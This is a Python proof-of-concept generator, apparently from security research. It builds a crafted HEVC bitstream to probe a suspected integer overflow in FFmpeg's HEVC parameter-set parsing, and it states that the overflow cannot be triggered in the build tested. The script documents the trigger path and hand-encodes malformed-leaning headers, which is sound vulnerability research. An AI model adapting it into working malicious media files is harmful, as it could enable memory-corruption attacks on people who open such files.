#!/usr/bin/env python3
"""
PoC generator for VULN-001:
  Integer overflow in pic_area_in_ctbs in ff_hevc_decode_nal_pps() / setup_pps().

Trigger path:
  ffmpeg -i <crafted_hevc> -f null - -> HEVC parser -> parse_nal_units()
  -> ff_hevc_decode_nal_pps() -> setup_pps()
  -> pic_area_in_ctbs = sps->ctb_width * sps->ctb_height (int overflow)
  -> av_malloc_array(pic_area_in_ctbs, ...) underallocates
  -> OOB write in ctb_addr_ts_to_rs loop

Analysis results (FFmpeg N-126435-gf93cd72dde, built 2026):
  - av_image_check_size constraint (libavutil/imgutils.c:301):
      (8*w + 1024) * (h + 128) < INT_MAX  =>  max area ~268 million pixels
  - log2_ctb_size enforced >= 4 (CTB >= 16x16) by ps.c:1665
  - Maximum pic_area_in_ctbs with CTB=16 and max 16kx16k dims: ~1,000,000
  - INT_MAX = 2,147,483,647 -- overflow requires > 2.1 billion CTBs
  - CONCLUSION: the signed int32 overflow is NOT triggerable in this build.

This PoC exercises the closest-to-overflow path:
  - Width = 16000, Height = 16000 (pass av_image_check_size; both div by 8)
  - log2_min_cb_size = 3, log2_diff = 1 => log2_ctb_size = 4 (CTB 16x16)
  - ctb_width = ctb_height = 1000 => pic_area_in_ctbs = 1,000,000 (no overflow)
"""

import struct
import os


class BitWriter:
    def __init__(self):
        self.bits = []

    def write_bit(self, b):
        self.bits.append(b & 1)

    def write_bits(self, value, n):
        for i in range(n - 1, -1, -1):
            self.write_bit((value >> i) & 1)

    def write_ue(self, value):
        """Unsigned Exp-Golomb encoding."""
        if value == 0:
            self.write_bit(1)
            return
        k = (value + 1).bit_length() - 1
        self.write_bits(0, k)
        self.write_bits(value + 1, k + 1)

    def write_se(self, value):
        """Signed Exp-Golomb encoding."""
        if value <= 0:
            u = -2 * value
        else:
            u = 2 * value - 1
        self.write_ue(u)

    def trailing_bits(self):
        self.write_bit(1)
        while len(self.bits) % 8 != 0:
            self.write_bit(0)

    def to_bytes(self):
        self.trailing_bits()
        result = bytearray()
        for i in range(0, len(self.bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | self.bits[i + j]
            result.append(byte)
        return bytes(result)


def apply_emulation_prevention(data):
    """Insert emulation prevention byte 0x03 when 0x00 0x00 {0x00,0x01,0x02,0x03} appears."""
    result = bytearray()
    zero_count = 0
    for byte in data:
        if zero_count >= 2 and byte <= 3:
            result.append(0x03)
            zero_count = 0
        if byte == 0:
            zero_count += 1
        else:
            zero_count = 0
        result.append(byte)
    return bytes(result)


def make_nal(nal_type, rbsp_bytes):
    """Wrap RBSP in NAL unit with Annex B 4-byte start code."""
    # NAL header (2 bytes):
    # forbidden_zero_bit(1) | nal_unit_type(6) | nuh_layer_id(6) | nuh_temporal_id_plus1(3)
    header = (0 << 15) | (nal_type << 9) | (0 << 3) | 1
    header_bytes = struct.pack('>H', header)
    payload = header_bytes + apply_emulation_prevention(rbsp_bytes)
    return b'\x00\x00\x00\x01' + payload


def write_profile_tier_level(bw, profile_present, max_sub_layers_minus1):
    """
    Write profile_tier_level() syntax for HEVC Main profile, Level 5.1.
    Follows FFmpeg's decode_profile_tier_level() + parse_ptl() logic exactly.
    """
    if profile_present:
        bw.write_bits(0, 2)          # general_profile_space = 0
        bw.write_bit(0)              # general_tier_flag = 0 (Main tier)
        bw.write_bits(1, 5)          # general_profile_idc = 1 (Main profile)
        # profile_compatibility_flag[32]: read as 32 individual bits, flag[1]=1
        # Written MSB-first: bit0=0, bit1=1, rest=0 => value 0x40000000
        bw.write_bits(0x40000000, 32)
        bw.write_bit(1)              # general_progressive_source_flag
        bw.write_bit(0)              # general_interlaced_source_flag
        bw.write_bit(0)              # general_non_packed_constraint_flag
        bw.write_bit(1)              # general_frame_only_constraint_flag
        # profile_idc=1: not in {4..10}, not 2 => else branch: 43 reserved zero bits
        bw.write_bits(0, 43)
        # check_profile_idc(1)=True => general_inbld_flag (1 bit)
        bw.write_bit(0)
    # general_level_idc (8 bits): 153 = Level 5.1
    bw.write_bits(153, 8)
    # max_sub_layers_minus1=0 => loop runs 0 times, no reserved_zero_2bits needed


def make_vps():
    """Minimal VPS RBSP (Video Parameter Set)."""
    bw = BitWriter()
    bw.write_bits(0, 4)      # vps_video_parameter_set_id = 0
    bw.write_bit(1)          # vps_base_layer_internal_flag = 1 (required by FFmpeg)
    bw.write_bit(1)          # vps_base_layer_available_flag = 1 (required by FFmpeg)
    bw.write_bits(0, 6)      # vps_max_layers_minus1 = 0 (single layer)
    bw.write_bits(0, 3)      # vps_max_sub_layers_minus1 = 0
    bw.write_bit(1)          # vps_temporal_id_nesting_flag = 1
    bw.write_bits(0xFFFF, 16)  # vps_reserved_0xffff_16bits
    write_profile_tier_level(bw, True, 0)
    bw.write_bit(0)          # vps_sub_layer_ordering_info_present_flag = 0
    # i = vps_max_sub_layers - 1 = 0:
    bw.write_ue(1)           # vps_max_dec_pic_buffering_minus1[0] = 1 => value=2
    bw.write_ue(0)           # vps_max_num_reorder_pics[0] = 0
    bw.write_ue(0)           # vps_max_latency_increase_plus1[0] = 0
    bw.write_bits(0, 6)      # vps_max_layer_id = 0
    bw.write_ue(0)           # vps_num_layer_sets_minus1 = 0 => 1 layer set
    # vps_num_layer_sets=1 => no layer_id_included_flag bits
    bw.write_bit(0)          # vps_timing_info_present_flag = 0
    bw.write_bit(0)          # vps_extension_flag = 0
    return bw.to_bytes()


def make_sps(width, height):
    """
    SPS RBSP targeting integer overflow in pic_area_in_ctbs.

    Chosen parameters:
      - width=16000, height=16000 (maximum that pass av_image_check_size)
      - log2_min_cb_size=3, log2_diff=1 => log2_ctb_size=4 (CTB 16x16)
      - Results in ctb_width=ctb_height=1000, pic_area=1,000,000
      - No overflow (requires ~2.1B CTBs, impossible with size limits)
    """
    bw = BitWriter()
    bw.write_bits(0, 4)      # sps_video_parameter_set_id = 0
    bw.write_bits(0, 3)      # sps_max_sub_layers_minus1 = 0 => max_sub_layers=1
    bw.write_bit(1)          # sps_temporal_id_nesting_flag = 1
    write_profile_tier_level(bw, True, 0)
    bw.write_ue(0)           # sps_seq_parameter_set_id = 0

    # Coding dimensions
    bw.write_ue(1)           # chroma_format_idc = 1 (4:2:0)
    bw.write_ue(width)       # pic_width_in_luma_samples
    bw.write_ue(height)      # pic_height_in_luma_samples
    bw.write_bit(0)          # conformance_window_flag = 0

    bw.write_ue(0)           # bit_depth_luma_minus8 = 0 => 8-bit
    bw.write_ue(0)           # bit_depth_chroma_minus8 = 0 => 8-bit
    bw.write_ue(0)           # log2_max_pic_order_cnt_lsb_minus4 = 0 => lsb=4

    # Temporal layer ordering info (sub_layer_ordering_info_present_flag=0)
    bw.write_bit(0)          # sps_sub_layer_ordering_info_present_flag = 0
    # i = max_sub_layers - 1 = 0:
    bw.write_ue(1)           # sps_max_dec_pic_buffering_minus1[0] = 1 => 2
    bw.write_ue(0)           # sps_max_num_reorder_pics[0] = 0
    bw.write_ue(0)           # sps_max_latency_increase_plus1[0] = 0

    # CTB/CB/TB sizes - KEY PARAMETERS for the vulnerability path
    # log2_min_cb_size = 3 (minimum valid; min CB = 8x8)
    bw.write_ue(0)           # log2_min_luma_coding_block_size_minus3 = 0 => log2=3
    # log2_diff = 1 => log2_ctb_size = 4 (CTB = 16x16)
    # With width=height=16000: ctb_width = ctb_height = 1000
    # pic_area_in_ctbs = 1,000,000 (max possible, still no int32 overflow)
    bw.write_ue(1)           # log2_diff_max_min_luma_coding_block_size = 1
    bw.write_ue(0)           # log2_min_luma_transform_block_size_minus2 = 0 => log2_min_tb=2
    # log2_diff_tb = 2 => log2_max_trafo = 4; constraint: <= min(log2_ctb=4, 5)=4. OK.
    bw.write_ue(2)           # log2_diff_max_min_luma_transform_block_size = 2
    bw.write_ue(0)           # max_transform_hierarchy_depth_inter = 0; <= 4-2=2. OK.
    bw.write_ue(0)           # max_transform_hierarchy_depth_intra = 0

    bw.write_bit(0)          # scaling_list_enabled_flag = 0
    bw.write_bit(0)          # amp_enabled_flag = 0
    bw.write_bit(0)          # sample_adaptive_offset_enabled_flag = 0
    bw.write_bit(0)          # pcm_enabled_flag = 0
    bw.write_ue(0)           # num_short_term_ref_pic_sets = 0
    bw.write_bit(0)          # long_term_ref_pics_present_flag = 0
    bw.write_bit(0)          # sps_temporal_mvp_enabled_flag = 0
    bw.write_bit(0)          # strong_intra_smoothing_enabled_flag = 0
    bw.write_bit(0)          # vui_parameters_present_flag = 0
    bw.write_bit(0)          # sps_extension_present_flag = 0
    return bw.to_bytes()


def make_pps():
    """Minimal PPS RBSP (Picture Parameter Set)."""
    bw = BitWriter()
    bw.write_ue(0)           # pps_pic_parameter_set_id = 0
    bw.write_ue(0)           # pps_seq_parameter_set_id = 0
    bw.write_bit(0)          # dependent_slice_segments_enabled_flag = 0
    bw.write_bit(0)          # output_flag_present_flag = 0
    bw.write_bits(0, 3)      # num_extra_slice_header_bits = 0
    bw.write_bit(0)          # sign_data_hiding_enabled_flag = 0
    bw.write_bit(0)          # cabac_init_present_flag = 0
    bw.write_ue(0)           # num_ref_idx_l0_default_active_minus1 = 0 => 1
    bw.write_ue(0)           # num_ref_idx_l1_default_active_minus1 = 0 => 1
    bw.write_se(0)           # init_qp_minus26 = 0
    bw.write_bit(0)          # constrained_intra_pred_flag = 0
    bw.write_bit(0)          # transform_skip_enabled_flag = 0
    bw.write_bit(0)          # cu_qp_delta_enabled_flag = 0
    bw.write_se(0)           # pps_cb_qp_offset = 0
    bw.write_se(0)           # pps_cr_qp_offset = 0
    bw.write_bit(0)          # pps_slice_chroma_qp_offsets_present_flag = 0
    bw.write_bit(0)          # weighted_pred_flag = 0
    bw.write_bit(0)          # weighted_bipred_flag = 0
    bw.write_bit(0)          # transquant_bypass_enabled_flag = 0
    bw.write_bit(0)          # tiles_enabled_flag = 0
    bw.write_bit(0)          # entropy_coding_sync_enabled_flag = 0
    # tiles_enabled_flag=0: no tile parameters
    bw.write_bit(1)          # loop_filter_across_slices_enabled_flag = 1
    bw.write_bit(0)          # deblocking_filter_control_present_flag = 0
    bw.write_bit(0)          # pps_scaling_list_data_present_flag = 0
    bw.write_bit(0)          # lists_modification_present_flag = 0
    bw.write_ue(0)           # log2_parallel_merge_level_minus2 = 0; <= log2_ctb=4. OK.
    bw.write_bit(0)          # slice_segment_header_extension_present_flag = 0
    bw.write_bit(0)          # pps_extension_present_flag = 0
    return bw.to_bytes()


def main():
    outfile = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.265')

    # Maximum dimensions that pass av_image_check_size AND are divisible by
    # 2^log2_min_cb_size = 8 (required by av_zero_extend check in ps.c:1688)
    # Check: (8*16000 + 1024) * (16000 + 128) = 129024 * 16128 = 2,080,899,072 < INT_MAX
    WIDTH  = 16000
    HEIGHT = 16000

    # CTB parameters: log2_ctb_size=4 => CTB=16x16
    # ctb_width = ctb_height = 16000/16 = 1000
    # pic_area_in_ctbs = 1,000,000 (maximum achievable, still no int32 overflow)
    CTB_SIZE = 16
    ctb_w = WIDTH  // CTB_SIZE
    ctb_h = HEIGHT // CTB_SIZE
    pic_area = ctb_w * ctb_h

    print(f"Target dimensions: {WIDTH}x{HEIGHT}")
    print(f"CTB size: {CTB_SIZE}x{CTB_SIZE} (log2_ctb_size=4)")
    print(f"ctb_width={ctb_w}, ctb_height={ctb_h}")
    print(f"pic_area_in_ctbs = {pic_area:,}")
    print(f"INT_MAX           = {2**31 - 1:,}")
    print(f"Overflow possible: {pic_area > 2**31 - 1}")
    print()

    vps_rbsp = make_vps()
    sps_rbsp = make_sps(WIDTH, HEIGHT)
    pps_rbsp = make_pps()

    print(f"VPS RBSP: {len(vps_rbsp)} bytes")
    print(f"SPS RBSP: {len(sps_rbsp)} bytes")
    print(f"PPS RBSP: {len(pps_rbsp)} bytes")

    VPS_NUT = 32
    SPS_NUT = 33
    PPS_NUT = 34

    bitstream = (
        make_nal(VPS_NUT, vps_rbsp) +
        make_nal(SPS_NUT, sps_rbsp) +
        make_nal(PPS_NUT, pps_rbsp)
    )

    with open(outfile, 'wb') as f:
        f.write(bitstream)

    print(f"Generated: {outfile} ({len(bitstream)} bytes)")
    print()
    print("NOTE: The signed int32 overflow in pic_area_in_ctbs is NOT triggerable")
    print("      in this FFmpeg build. av_image_check_size limits the maximum")
    print("      area to ~268M pixels, and log2_ctb_size >= 4 is enforced,")
    print("      so pic_area_in_ctbs <= ~1,050,000 << INT_MAX = 2,147,483,647.")


if __name__ == '__main__':
    main()
